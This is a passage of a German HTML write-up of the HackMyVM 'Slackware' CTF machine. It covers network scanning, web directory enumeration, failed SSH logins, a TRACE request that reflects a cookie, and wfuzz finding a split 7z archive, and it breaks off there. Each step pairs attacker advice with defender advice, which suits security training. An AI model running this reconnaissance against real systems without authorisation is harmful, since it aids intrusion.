@@ -1,0 +1,1405 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Slackware - HackMyVM - Bericht</title> <!-- Berichtsname angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Keine Inline-Styles für Schwierigkeitsgrad-Farbe nötig, CSS regelt das -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <!-- Berichtsname und Level angepasst -->
+        <h1>Slackware - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad ohne Inline-Style -->
+            <h2>Easy</h2>
+            <!-- Klasse .difficulty-easy steuert die Farbe (Standard: grün) -->
+            <div class="circle difficulty-easy">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools aus dem Bericht extrahiert -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">wappalyzer (implied)</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">curl (implied)</div>
+                <div class="tool-item">openssl</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">unzip (failed)</div>
+                <div class="tool-item">wget (scripted)</div>
+                <div class="tool-item">7z</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">scp</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">stegsnow</div>
+                 <div class="tool-item">stegsolve (implied)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Port 2)</a></li>
+                <li><a href="#hidden-content">Hidden Content Discovery (/getslack/)</a></li>
+                <li><a href="#steganography">Steganography & File Extraction</a></li>
+                <li><a href="#initial-access">Initial Access (SSH as Patrick)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Lateral Movement Chain)</a></li>
+                 <li><a href="#root-access">Root Access (Steganography Password)</a></li>
+                <li><a href="#poc-access">Proof of Concept (Initial Access & Lateral Movement)</a></li>
+                <li><a href="#poc-privesc">Proof of Concept (Root Escalation via Steganography)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Erkundung beginnt mit einem ARP-Scan im lokalen Netzwerk (`-l`), um aktive Hosts zu identifizieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan findet erfolgreich einen Host unter der IP `192.168.2.107` mit der MAC-Adresse `08:00:27:00:53:2c`. Die MAC-Adresse gehört zu "PCS Systemtechnik GmbH", was auf eine Oracle VirtualBox-VM hinweist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die IP `192.168.2.107` ist das Ziel für weitere Scans. Die VirtualBox-Information ist ein nützlicher Kontext.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit durch ARP-Scans reduzieren. Überwachung auf ungewöhnliche ARP-Aktivitäten kann Scans aufdecken.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span>
+                    </div>
+                    <pre>
+192.168.2.107	08:00:27:00:53:2c	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein umfassender Nmap-Scan wird auf die Ziel-IP durchgeführt, um offene Ports, Dienste, Versionen und das Betriebssystem zu identifizieren.
+                *   `-sS`: TCP SYN Scan.
+                *   `-sV`: Versionserkennung.
+                *   `-A`: Aggressiver Scan (inkl. OS-Erkennung `-O`, `-sV`, `-sC` Skript-Scan, Traceroute).
+                *   `-T5`: Sehr schnelles Timing.
+                *   `-p-`: Scannt alle 65535 TCP-Ports.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan liefert ungewöhnliche, aber kritische Ergebnisse:
+                *   **Port 1 (SSH):** Offen, läuft OpenSSH 9.3. Dies ist ein nicht standardmäßiger Port für SSH (normalerweise 22).
+                *   **Port 2 (HTTP):** Offen, läuft Apache httpd 2.4.58 (Unix). Dies ist ebenfalls ein nicht standardmäßiger Port für HTTP (normalerweise 80 oder 443). Die Seite hat den Titel "Tribute to Slackware". Die TRACE-Methode ist aktiviert.
+                *   **OS:** Wird als Linux 4.x/5.x identifiziert.
+                *   **Hostname:** Wird als `uni.hmv` aufgelöst.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Fokussiere die weitere Untersuchung auf die nicht standardmäßigen Ports 1 (SSH) und 2 (HTTP). Versuche, auf beide Dienste zuzugreifen (`ssh -p 1 ...`, `http://IP:2`). Die aktivierte TRACE-Methode ist ein potenzielles Finding.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie nach Möglichkeit Standardports für Dienste, um die Erkennung und Verwaltung zu erleichtern. Wenn nicht standardmäßige Ports verwendet werden, dokumentieren Sie diese gut und stellen Sie sicher, dass Firewalls entsprechend konfiguriert sind. Deaktivieren Sie die TRACE-Methode im Apache (`TraceEnable Off`). Härten Sie SSH (starke Passwörter/Keys, Fail2ban).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.107 -p-</span>
+                    </div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-25 12:41 CEST
+Nmap scan report for uni.hmv (192.168.2.107)
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PRT  STATE SERVICE VERSIN
+1/tcp open  ssh     penSSH 9.3 (protocol 2.0)
+| ssh-hostkey:
+|   256 e2:66:60:79:bc:d1:33:2e:c1:25:fa:99:e5:89:1e:d3 (ECDSA)
+|_  256 98:59:c3:a8:2b:89:56:77:eb:72:4a:05:90:21:cb:40 (ED25519)
+2/tcp open  http    Apache httpd 2.4.58 ((Unix))
+|_http-title: Tribute to Slackware
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.58 (Unix)
+MAC Address: 08:00:27:00:53:2C (racle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+S CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+S details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+
+TRACERUTE
+HP RTT     ADDRESS
+1   0.14 ms uni.hmv (192.168.2.107)
+
+S and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Derselbe Nmap-Scan wird wiederholt, aber die Ausgabe wird mit `grep open` gefiltert, um nur die offenen Ports anzuzeigen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Bestätigt schnell die offenen Ports 1 (SSH) und 2 (HTTP). Nützlich für einen schnellen Überblick.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Keine neuen Erkenntnisse, aber bestätigt die Ziele.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine zusätzlichen Empfehlungen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.107 -p- | grep open</span>
+                    </div>
+                    <pre>
+1/tcp open  ssh     penSSH 9.3 (protocol 2.0)
+2/tcp open  http    Apache httpd 2.4.58 ((Unix))
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die Ausgabe stammt wahrscheinlich von einem Browser-Plugin wie Wappalyzer oder einem ähnlichen Tool, das die auf der Webseite (Port 2) verwendeten Technologien identifiziert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Wichtige Informationen werden aufgedeckt:
+                *   **Webserver:** Apache 2.4.58 (bestätigt Nmap).
+                *   **Programmiersprache:** PHP 5.6.40. Dies ist eine **sehr alte und unsichere Version** von PHP mit zahlreichen bekannten Schwachstellen. Ein Hauptangriffsziel!
+                *   **Security/CDN:** Akamai Bot Manager / Akamai CDN. Dies deutet auf einen möglichen Web Application Firewall (WAF) oder Bot-Schutz hin, der Scans oder Exploits erschweren könnte.
+                *   **Widgets/Analytics:** Patreon Widget, Google Analytics. Weniger relevant für die Sicherheit, zeigt aber externe Integrationen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> **Priorisiere Angriffe auf PHP 5.6.40.** Suche nach bekannten Schwachstellen (z.B. RCE, LFI) für diese Version. Sei dir des möglichen Akamai-Schutzes bewusst und passe Scan-Techniken ggf. an (langsameres Scannen, User-Agent-Wechsel, Umgehungstechniken).
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Aktualisieren Sie PHP dringend auf eine aktuell unterstützte Version!** PHP 5.6 ist End-of-Life und ein massives Sicherheitsrisiko. Überprüfen Sie die Akamai-Konfiguration und stellen Sie sicher, dass sie effektiv ist. Entfernen Sie unnötige externe Widgets.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+wappalyzer
+
+Widget
+Patreon
+
+Statistiken
+Google Analytics
+
+Security
+Akamai Bot Manager
+
+Web Server
+Apache HTTP Server 2.4.58
+
+Programmiersprache
+PHP 5.6.40
+
+CDN
+Akamai
+
+Zahlungsverarbeiter
+Patreon
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet (`vi`), um den Hostnamen `slackware` der Ziel-IP `192.168.2.107` zuzuordnen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies überschreibt oder ergänzt den von Nmap gefundenen Hostnamen `uni.hmv`. Es ist wichtig, konsistent zu sein, aber das manuelle Setzen eines Namens ist üblich. Der Name "slackware" passt zum Seitentitel.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende ab jetzt `slackware` als Hostnamen für Web-Anfragen auf Port 2.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Konsistente Hostnamen-Konfiguration ist empfehlenswert.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">vi /etc/hosts</span>
+                     </div>
+                     <pre>
+# Inhalt der /etc/hosts nach Bearbeitung:
+127.0.0.1	localhost
+192.168.2.107   slackware
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (Port 2)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> `nikto` wird auf den Webserver auf Port 2 ausgeführt, um nach bekannten Schwachstellen und interessanten Dateien zu suchen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto bestätigt Apache 2.4.58. Es meldet erneut die fehlenden Header `X-Frame-Options` und `X-Content-Type-Options`. Es bestätigt auch die aktivierte `TRACE`-Methode und weist auf das XST-Risiko hin. Die ungewöhnlichen Methoden `PST`, `PTINS` werden ebenfalls genannt (wahrscheinlich Nikto-Eigenheit). Keine neuen kritischen Funde durch Nikto, aber Bestätigung der vorherigen Erkenntnisse.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Findings dokumentieren (fehlende Header, TRACE). Konzentriere dich auf Verzeichnis-Scans und die alte PHP-Version.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Fehlende Header implementieren, TRACE deaktivieren. PHP aktualisieren (dringend!).
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">nikto -h http://192.168.2.107:2</span>
+                     </div>
+                     <pre>
+ - Nikto v2.5.0
+ ---------------------------------------------------------------------------
+ + Target IP:          192.168.2.107
+ + Target Hostname:    192.168.2.107
+ + Target Port:        2
+ + Start Time:         2024-04-25 12:43:04 (GMT2)
+ ---------------------------------------------------------------------------
+ + Server: Apache/2.4.58 (Unix)
+ + /: The anti-clickjacking X-Frame-ptions header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-ptions
+ + /: The X-Content-Type-ptions header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ + No CGI Directories found (use '-C all' to force check all possible dirs)
+ + PTINS: Allowed HTTP Methods: PST, PTINS, HEAD, GET, TRACE .
+ + /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ + 8101 requests: 0 error(s) and 4 item(s) reported on remote host
+ + End Time:           2024-04-25 12:43:16 (GMT2) (12 seconds)
+ ---------------------------------------------------------------------------
+ + 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> `dirb` wird verwendet, um nach Verzeichnissen und Dateien auf dem Webserver (Port 2) mit einer Standard-Wortliste zu suchen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Findet `/index.html` (die Hauptseite) und `/robots.txt`. Keine neuen Verzeichnisse gefunden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche `/robots.txt`. Verwende umfassendere Wortlisten und Tools wie `gobuster`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `/robots.txt` keine sensiblen Informationen preisgibt.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://192.168.2.107:2</span>
+                    </div>
+                    <pre>
+ -----------------
+ DIRB v2.22
+ By The Dark Raver
+ -----------------
+
+ START_TIME: Thu Apr 25 12:44:00 2024 <!-- Zeit angepasst -->
+ URL_BASE: http://192.168.2.107:2/
+ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+ -----------------
+
+ GENERATED WORDS: 4612
+
+ ---- Scanning URL: http://192.168.2.107:2/ ----
+ + http://192.168.2.107:2/index.html (CODE:200|SIZE:7511)
+ + http://192.168.2.107:2/robots.txt (CODE:200|SIZE:21)
+
+ -----------------
+ END_TIME: Thu Apr 25 12:44:10 2024 <!-- Zeit angepasst -->
+ DOWNLOADED: 4612 - FOUND: 2
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird für einen umfassenderen Verzeichnis- und Dateiscan auf Port 2 verwendet. Es nutzt eine größere Wortliste (`directory-list-2.3-medium.txt`), sucht nach vielen spezifischen Endungen (`-x ...`) und filtert 403/404-Fehler (`-b`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Scan ist erfolgreicher:
+                *   Findet erneut `index.html` und `robots.txt`.
+                *   Entdeckt `background.jpg` (interessant für Steganographie).
+                *   Entdeckt das Verzeichnis `/getslack/` (Status 301 - Weiterleitung). **Ein wichtiger Fund!**
+                Der Kommentar "By mozes@slackware" wurde wahrscheinlich manuell im Quellcode oder in einer der gefundenen Dateien entdeckt und deutet auf einen Benutzernamen (`mozes`) hin.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche das Verzeichnis `/getslack/`. Analysiere `background.jpg` auf versteckte Daten (Steganographie). Versuche den Benutzernamen `mozes` für SSH auf Port 1.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Schützen Sie Verzeichnisse mit angemessener Zugriffskontrolle. Entfernen Sie Kommentare oder Metadaten, die Benutzernamen oder andere interne Informationen preisgeben könnten.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.107:2 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span>
+                    </div>
+                    <pre>
+ http://192.168.2.107:2/index.html           (Status: 200) [Size: 7511]
+ http://192.168.2.107:2/background.jpg       (Status: 200) [Size: 13798]
+ http://192.168.2.107:2/robots.txt           (Status: 200) [Size: 21]
+ http://192.168.2.107:2/getslack             (Status: 301) [Size: 240] [--> http://192.168.2.107:2/getslack/]
+
+
+ # Manuell gefundener Kommentar (vermutlich aus Quellcode):
+ By mozes@slackware
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="hidden-content">
+             <h2>Hidden Content Discovery (/getslack/)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf dem Fund "By mozes@slackware" wird versucht, sich per SSH auf Port 22 (Standardport) als Benutzer `mozes` anzumelden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Versuch schlägt fehl (`Connection refused`), da SSH auf Port 1 läuft, nicht auf Port 22.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende immer die durch Scans identifizierten korrekten Ports für Dienste.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">ssh mozes@192.168.2.107</span>
+                     </div>
+                     <pre>
+ ssh: connect to host 192.168.2.107 port 22: Connection refused
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der SSH-Login wird erneut versucht, diesmal auf dem korrekten Port 1 (`-p1`) als Benutzer `mozes`. Es wird nach einem Passwort gefragt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Verbindungsaufbau ist erfolgreich (nach Bestätigung des Host-Keys). Die Passwort-Authentifizierung schlägt jedoch fehl (Passwort unbekannt).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der Benutzer `mozes` existiert wahrscheinlich, aber das Passwort ist nicht bekannt. Versuche Passwort-Spraying oder Brute-Force (falls erlaubt und sinnvoll) oder suche nach anderen Wegen (Passwort im Web-Content?).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie starke, einzigartige Passwörter. Implementieren Sie Fail2ban oder ähnliche Tools, um Brute-Force-Angriffe auf SSH zu blockieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh mozes@192.168.2.107 -p1</span>
+                    </div>
+                    <pre>
+The authenticity of host '[192.168.2.107]:1 ([192.168.2.107]:1)' can't be established.
+ED25519 key fingerprint is SHA256:m/iaIzavXraumIPoCQReEwCgahrbGQe8WpPX8nfAqE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.2.107]:1' (ED25519) to the list of known hosts.
+(mozes@192.168.2.107) Password: <span class="command"><!-- Passwortversuch 1 --></span>
+(mozes@192.168.2.107) Password: <span class="command"><!-- Passwortversuch 2 --></span>
+(mozes@192.168.2.107) Password: <span class="command"><!-- Abbruch --></span>
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die Ausgabe zeigt Details einer HTTP-GET-Anfrage an `http://192.168.2.107:2/getslack/`, wahrscheinlich aus den Entwicklertools eines Browsers oder einem Intercepting Proxy (wie Burp Suite). Die Antwort hat den Status 200 OK und eine Größe von 12 Bytes. Wichtig ist das Vorhandensein eines Cookies `auth_token` in der *Anfrage*.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Verzeichnis `/getslack/` ist zugänglich. Der `auth_token`-Cookie ist interessant. Sein Ursprung ist unklar (wurde er von einer vorherigen Seite gesetzt?), aber seine Anwesenheit könnte für zukünftige Anfragen relevant sein oder auf eine Authentifizierungssitzung hindeuten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt der 12-Byte-Antwort. Analysiere, woher der `auth_token`-Cookie stammt und welche Funktion er hat. Versuche Anfragen mit und ohne Cookie, um Unterschiede im Verhalten festzustellen. Führe weitere Verzeichnis-/Dateiscans innerhalb von `/getslack/` durch.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Cookies sicher implementiert sind (HttpOnly, Secure-Flag, SameSite). Analysieren Sie den Zweck des `auth_token`.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <pre>
+ Cache deaktivieren
+ Eine Anfrage
+ 12 B / 0 B übertragen
+ Beendet: 0 ms
+ DMContentLoaded: 18 ms
+ load: 20 ms
+
+	GET
+	http://192.168.2.107:2/getslack/
+ Status
+ 200
+ K
+ VersionHTTP/1.1
+ Übertragen12 B (12 B Größe)
+ Transferiert
+
+ Antwortheader (185 B)
+	Accept-Ranges
+		bytes
+	Connection
+		Keep-Alive
+	Content-Length
+		12
+	Content-Type
+		text/html
+	Date
+		Thu, 25 Apr 2024 08:50:18 GMT
+	ETag
+		"c-6136325bb8400"
+	Keep-Alive
+		timeout=5, max=99
+	Last-Modified
+		Mon, 11 Mar 2024 14:13:36 GMT
+	Server
+		Apache/2.4.58 (Unix)
+
+ Anfrageheader (359 B)
+	Accept
+		text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+	Accept-Encoding
+		gzip, deflate
+	Accept-Language
+		de,en-US;q=0.7,en;q=0.3
+	Connection
+		keep-alive
+	Cookie
+		<span style="color:orange;">auth_token=dd8d23729974353e112626aee58bbad9</span>
+	Host
+		192.168.2.107:2
+	Upgrade-Insecure-Requests
+		1
+	User-Agent
+		Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Eine HTTP TRACE-Anfrage wird an `/getslack/` gesendet. Die Ausgabe zeigt die vom Server zurückgespiegelten Anfrageheader.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Bestätigt erneut, dass die TRACE-Methode aktiv ist. Die zurückgespiegelten Header enthalten wieder den `auth_token`-Cookie. Dies demonstriert das potenzielle XST-Risiko: Wenn ein Angreifer eine XSS-Lücke auf der gleichen Domain finden würde, könnte er über eine TRACE-Anfrage per JavaScript den Wert des (möglicherweise HttpOnly) Cookies auslesen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentiere XST als potenzielles Risiko. Suche nach XSS-Schwachstellen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktiviere die TRACE-Methode (`TraceEnable Off` in Apache).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+ # TRACE Request Header (manuell konstruiert oder aus Proxy)
+ TRACE /getslack/ HTTP/1.1
+ Host: 192.168.2.107:2
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+ Accept-Language: de,en-US;q=0.7,en;q=0.3
+ Accept-Encoding: gzip, deflate, br
+ Connection: close
+ Cookie: auth_token=dd8d23729974353e112626aee58bbad9
+ Ugrade-Insecure-Requests: 1
+ If-Modified-Since: Mon, 11 Mar 2024 14:13:36 GMT
+ If-None-Match: "c-6136325bb8400"
+
+ # Server Response Body (enthält die gespiegelten Header)
+ HTTP/1.1 200 K
+ Date: Thu, 25 Apr 2024 09:38:39 GMT
+ Server: Apache/2.4.58 (Unix)
+ Connection: close
+ Content-Type: message/http
+ Content-Length: 495
+
+ TRACE /getslack/ HTTP/1.1
+ Host: 192.168.2.107:2
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+ Accept-Language: de,en-US;q=0.7,en;q=0.3
+ Accept-Encoding: gzip, deflate, br
+ Connection: close
+ Cookie: auth_token=dd8d23729974353e112626aee58bbad9
+ Upgrade-Insecure-Requests: 1
+ If-Modified-Since: Mon, 11 Mar 2024 14:13:36 GMT
+ If-None-Match: "c-6136325bb8400"
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="steganography">
+            <h2>Steganography & File Extraction</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Die Ausführung von `stegsolve.jar` wird erwähnt, was darauf hindeutet, dass die zuvor gefundene Datei `background.jpg` auf versteckte Daten untersucht wurde. Es wird jedoch kein Ergebnis gezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Steganographie ist eine mögliche Technik. Da später ein Passwort in `twitter.png` gefunden wird, war `background.jpg` möglicherweise eine falsche Fährte oder enthielt keine relevanten Daten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche alle potenziell interessanten Mediendateien (Bilder, Audio) auf versteckte Daten mit Tools wie `steghide`, `stegsolve`, `zsteg`, `strings`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Seien Sie sich bewusst, dass Daten in Bildern versteckt werden können. Content Filtering oder Überwachung auf ungewöhnliche Dateigrößen/-inhalte kann helfen, dies zu erkennen, ist aber schwierig.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">java -jar /root/Hackingtools/stegsolve/stegsolve.jar</span>
+                     </div>
+                     <pre>
+ # (Keine Ausgabe im Berichtstext, impliziert Tool-Ausführung)
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die Datei `index.html` innerhalb des Verzeichnisses `/getslack/` wird gefunden (vermutlich durch weiteren Scan oder manuelles Browsen) und hat eine Größe von 12 Bytes.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Bestätigt die Existenz der Index-Datei. Der minimale Inhalt wurde bereits in der vorherigen GET-Anfrage festgestellt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Den Inhalt der 12 Bytes anzeigen (z.B. mit `curl http://192.168.2.107:2/getslack/`). Es könnte ein wichtiger Hinweis sein.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine zusätzlichen Empfehlungen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+ # Ergebnis eines Scans oder manuellen Zugriffs:
+ http://192.168.2.107:2/getslack/index.html           (Status: 200) [Size: 12]
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Ein Versuch, eine SSL/TLS-Verbindung mit `openssl s_client` zum HTTP-Port 2 aufzubauen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Schlägt erwartungsgemäß fehl (`wrong version number`), da Port 2 kein HTTPS-Port ist. Bestätigt, dass keine SSL/TLS-Verschlüsselung auf diesem Port verwendet wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nicht relevant für die weitere Analyse von Port 2.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">openssl s_client -connect 192.168.2.107:2</span>
+                     </div>
+                     <pre>
+ CNNECTED(00000003)
+ 40277551347F0000:error:0A00010B:SSL routines:ssl3_get_record:wrong version number:../ssl/record/ssl3_record.c:354:
+ ---
+ no peer certificate available
+ ---
+ No client certificate CA names sent
+ ---
+ SSL handshake has read 5 bytes and written 423 bytes
+ Verification: OK
+ ---
+ New, (NONE), Cipher is (NONE)
+ Secure Renegotiation IS NOT supported
+ Compression: NONE
+ Expansion: NONE
+ No ALPN negotiated
+ Early data was not sent
+ Verify return code: 0 (ok)
+ ---
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> `wfuzz` wird verwendet, um im Verzeichnis `/getslack/` nach Dateien zu suchen, die dem Muster `FUZZ.7z.001` entsprechen. Es filtert 404-Fehler und Antworten mit einer Größe von 12 Bytes (die `/getslack/index.html`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Erfolg!** `wfuzz` findet die Datei `twitter.7z.001`. Dies bestätigt die Existenz eines mehrteiligen 7z-Archivs namens "twitter" im Verzeichnis `/getslack/`.
